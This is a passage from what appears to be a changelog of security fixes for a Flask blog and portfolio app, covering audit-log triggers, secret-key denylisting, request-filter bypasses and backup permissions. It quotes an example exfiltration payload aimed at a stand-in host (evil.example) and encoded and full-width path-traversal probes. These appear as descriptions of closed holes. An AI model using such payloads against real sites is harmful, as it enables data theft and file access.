...
### Security — `Vary: Accept-Language` on every response (#90)

- The global `after_request` handler in `app/__init__.py` now appends `Accept-Language` to the response's `Vary` header (merging with any existing entries such as `Accept-Encoding` from gzip middleware). Public pages render translated content selected from `Accept-Language` plus the locale cookie, but the response previously carried no `Vary` directive — a CDN or shared cache would cache the first visitor's locale and replay it to subsequent visitors regardless of their `Accept-Language` header. Admin responses already carry `Cache-Control: no-store` so the extra `Vary` entry is a no-op there; public responses gain the correct cache-key signal.
- Two regression tests in `tests/test_i18n.py`: every public route (`/`, `/blog`, `/portfolio`, `/contact`) carries `Vary: Accept-Language`, and the merge preserves any pre-existing `Vary` entries.
### Security — `admin_activity_log` enforced append-only via SQLite triggers (#105)

- Migration 013 installs two `BEFORE` triggers on `admin_activity_log` that `RAISE(ABORT)` on `DELETE` and `UPDATE`. The audit trail was documented as append-only since Migration 003, but documentation enforced nothing — any code path with a `db` handle could `DELETE FROM admin_activity_log WHERE ...` and erase history silently. Triggers turn the contract into a runtime invariant: any unauthorised mutation now fails with `sqlite3.IntegrityError`. Idempotent (`CREATE TRIGGER IF NOT EXISTS`) so the Phase 21.5 re-run contract still holds.
- `app/services/activity_log.py:purge_old_entries` is now the single, documented gate for the retention path. The function drops the DELETE trigger, runs the bounded retention `DELETE`, then recreates the trigger inside a `finally` so a raise during the DELETE still leaves the table guarded on return. The recreate SQL mirrors the migration verbatim — same trigger name, same body, same error message — and a comment in the module docstring binds the two together so a future migration edit ports across.
- Three regression tests in `tests/test_admin.py` lock the contract: a parametrized `test_admin_activity_log_blocks_direct_mutation` covers `DELETE` and `UPDATE` (both raise `sqlite3.IntegrityError`); `test_admin_activity_log_purge_works` confirms `purge_old_entries` deletes only rows older than the retention window and the recent row survives; `test_admin_activity_log_trigger_restored_after_purge` confirms a fresh `DELETE` against the table after a purge still raises — the `try`/`finally` recreate path holds.
### Security — rotate test secret_key + restore denylist coverage (#125)

- The `tests/conftest.py` fixture used to write `secret_key: "test-secret-key-for-testing-only"` into the on-disk config. That literal sat in plain view in git history, was exactly 32 chars (so it slipped past the length floor on its own), and an operator who copy-pasted the fixture into a real `config.yaml` would have booted production with a guessable session-signing key. The fixture now writes a high-entropy `test-do-not-use-…64-hex…` sentinel exposed as `tests.conftest.TEST_SECRET_KEY`; tests that wrote their own ad-hoc test config (`tests/test_security.py::_admin_app_with_trusted_proxies`) import the constant rather than re-baking the literal.
- `_WEAK_SECRET_KEYS` in `app/services/config.py` now re-includes `test-secret-key-for-testing-only` (and the long-retired `benchmark-key`) so the operator-copies-the-fixture path fatals at boot regardless of length. The Phase 23.4 comment that justified dropping the entry (because the fixture used it) no longer applies — the fixture has moved on, and the literal in git history is exactly the kind of guessable string the denylist exists to catch.
- Two regression tests in `tests/test_security.py` lock the contract: `test_well_known_test_secret_key_is_denylisted` boots `load_config` with the old fixture string and asserts `SystemExit`; `test_current_test_fixture_secret_key_validates_cleanly` pins that the new sentinel passes `_validate_secret_key` so a future drift onto the denylist trips here instead of at suite collection.
### Security — theme-editor postMessage requires same-origin + matching source (#130)

- The theme-editor admin page (`app/templates/admin/theme.html`) injects a `message` listener into the live-preview iframe that applied `setProperty(property, value)` on any incoming message — no `event.origin` check, no `event.source` comparison. Any cross-origin sender (or a hostile same-origin frame that has obtained the iframe's window reference) could push attacker-controlled CSS through the listener, e.g. `background-image: url(https://evil.example/?leak=...)` for data exfiltration via the request URL. The injected listener now drops messages whose `event.origin` does not equal `window.location.origin` AND whose `event.source` is not `window.parent`. Both checks are required: origin alone is bypassable by a malicious same-origin frame, source alone won't catch a hostile frame that has handed back a parent reference.
- Manual verification only; automated regression waits on Phase 31 (Playwright). The commit body documents the smoke procedure (devtools `window.postMessage` from same origin should be ignored; only the legitimate parent-driven path updates the preview).
...
### Security — request_filter bypass closures (#84, #85, #88, #136)

- **#84 — body-aware SQLi scan:** `app/services/request_filter.py` previously inspected `request.query_string` only, so SQLi fingerprints in POST/PUT/PATCH bodies (form-encoded or JSON) bypassed the regex unscathed. Body inspection now runs on body-bearing methods, decoding the first 64 KB of `request.get_data(parse_form_data=False, cache=True)`. The 64 KB cap is well above any realistic SQLi payload but well below any photo-upload blob, so the regex stays cheap on legitimate POSTs. `cache=True` keeps the bytes available to view code that re-reads the body.
- **#85 — chunked transfer enforcement:** `Transfer-Encoding: chunked` requests with no `Content-Length` previously skipped both the body-size gate and the missing-Content-Type gate (which only fired when `content_length > 0`). Chunked requests now force-read the body so Werkzeug's `LimitedStream` enforces `MAX_CONTENT_LENGTH` (raising 413 on overflow), and the missing-CT gate explicitly opts-in chunked requests. A real chunked overflow at exactly the cap is detected by probing `wsgi.input` for one more byte and aborting 413 if any extra bytes remain.
- **#88 — recursive URL-decode for path traversal:** the path-traversal regex matched `request.path` (already partially decoded by Werkzeug) plus `RAW_URI` (gunicorn-only). Probes like `%2e%2e%2f` only fired on gunicorn; double-encoded `%252e%252e%252f` slipped past everywhere. The new `_normalise_path` helper iteratively `unquote`s up to five times until the string stops changing, so single- and double-encoded forms collapse to the literal `..` sequence before regex.
- **#136 — Unicode lookalike normalisation:** the path-traversal regex was byte-for-byte ASCII (`\.\.`). Full-width Unicode lookalikes (`．．` U+FF0E, `／` U+FF0F) bypassed it. `_normalise_path` now NFKC-normalises post-decode (folding full-width forms to ASCII) and strips bidi-override characters (U+202E, U+2066-U+2069) so an attacker can't smuggle traversal past the filter via RTL overrides.
- 14 regression tests in `tests/test_request_filter.py` lock all four contracts: SQLi-in-JSON-body blocked + logged with `sql_injection_probe` reason, chunked-with-oversized-body returns 400/413, chunked-with-no-Content-Type returns 400, single- and double-encoded `%2e%2e%2f` blocked, full-width `．．／` blocked, plus the unchanged baseline (normal request passes, `request_filter_enabled=false` disables, `request_filter_log_only=true` logs without blocking).
- One v0.3.2 test updated for the new body-scan contract: `tests/test_edge_cases_blog.py::test_sql_metacharacters_in_title_do_not_break_create` now exercises titles with apostrophes + literal hyphens (`O'Reilly's Guide to SQL -- best practices`) — the WAF allows them, so the parameterized-query layer still gets coverage. A new `test_sql_injection_fingerprint_in_body_blocked_by_waf` pins the new earlier-line-of-defense behaviour against the original Bobby Tables payload. Two more v0.3.2 parametrize fixtures (`tests/test_edge_cases_contact.py`, `tests/test_edge_cases_settings.py`) were similarly split: SQLi-fingerprint payloads moved to dedicated WAF-block tests; non-SQLi injection payloads continue to assert the parameterized-query / sanitiser contracts.

### Security — Phase v0.3.3-beta-2: backup tarball + sidecars chmod 0600 (#89)

- `create_backup` and `restore_backup` in `app/services/backups.py` now `os.chmod(...)` every operator-readable artifact to `0o600` (files) / `0o700` (directories) regardless of the process umask. The backup archive itself is chmodded *before* `os.replace()` finalises the atomic move (POSIX rename preserves the source mode, so a chmod after rename would still leave a brief window of `0o644`). The `pre-restore-*` sidecar directory and the DB copy inside it are locked down on creation; the photos sidecar tree (copied via `shutil.copytree`, which honours source modes) is walked and re-chmodded recursively. Backups carry `secret_key`, `password_hash`, SMTP credentials, and the entire site DB — at the previous default umask of `0o022` they shipped as `0o644` (world-readable on the operator host), which is the bug this phase closes.
- Four regression tests in `tests/test_backups.py` lock the contract: archive mode is `0o600` at umask `0o022` (the default that yields `0o644`), archive mode is `0o600` at umask `0o000` (proving the `chmod` wins over the most permissive umask, where `tarfile.open` would otherwise produce `0o666`), the pre-restore sidecar DB copy is `0o600` and its parent dir is `0o700`, and the sidecar photos tree is `0o600`/`0o700` after `copytree` even when the *source* photos are `0o644`.
### Security — `/resume?visibility=private` no longer security-through-obscurity (#126)

- The `/resume` route formerly advertised three visibility tiers — `public`, `private`, `off` — but the handler had no auth, token, or IP gate, so `private` was indistinguishable from `public` to anyone who knew the URL. The documented `?visibility=private` query parameter likewise had never been honoured by the handler. Both vestiges removed: the registry now offers a binary `public` / `off` toggle, and the route requires `resume_visibility='public'` exactly (any other value, including a stale `private` row, returns 404). Migration 013 normalises legacy `resume_visibility='private'` rows to `'public'` so existing deployments preserve byte-for-byte behaviour (the `private` value was already serving the file unconditionally to anyone with the link). Operators who actually want the resume hidden flip the setting to `off` from the admin UI.
- Two regression tests in `tests/test_app.py`: `?visibility=private` produces the same response as `/resume` with no query string (no special handling), and a legacy `private` setting value fails closed at the route handler rather than falling through to `send_from_directory`.
...
### Fixed — blog save race + `update_post` verifies existence (#139, #140)

- `create_post` and `update_post` in `app/services/blog.py` now wrap `_ensure_unique_slug` and the INSERT/UPDATE pair in an explicit `BEGIN IMMEDIATE` transaction (matches Phase 27.2's atomicity pattern; `app.db._InstrumentedConnection` doesn't forward the context-manager protocol so the explicit form is required). On `sqlite3.IntegrityError` the transaction rolls back and the loop retries with a freshly-computed slug — the racing INSERT has already taken `<slug>` so the retry's `_ensure_unique_slug` returns `<slug>-2`. Closes the SELECT-then-INSERT race where two concurrent saves of the same title both observed "no row with slug X" and the second INSERT tripped `UNIQUE(slug)` (#139).
- `update_post` now checks `cursor.rowcount` after the UPDATE; a 0-row result raises `ValueError("post not found: id=…")` BEFORE `_sync_tags` runs, and the surrounding `BEGIN IMMEDIATE` rolls back so no orphan `blog_tags` / `blog_post_tags` rows land for a missing parent. Closes the stale-form scenario where a post deleted between page load and submit silently UPDATEd 0 rows and `_sync_tags` then created junction entries pointing at a missing id (#140).
- Two regression tests in `tests/test_blog.py`: two threads racing `create_post` on the same title both succeed and produce distinct slugs (`hello-world` + `hello-world-2`); `update_post(999999, …, tags='orphan-tag')` raises `ValueError` and leaves zero `blog_post_tags` rows and zero `blog_tags` rows for the missing id.
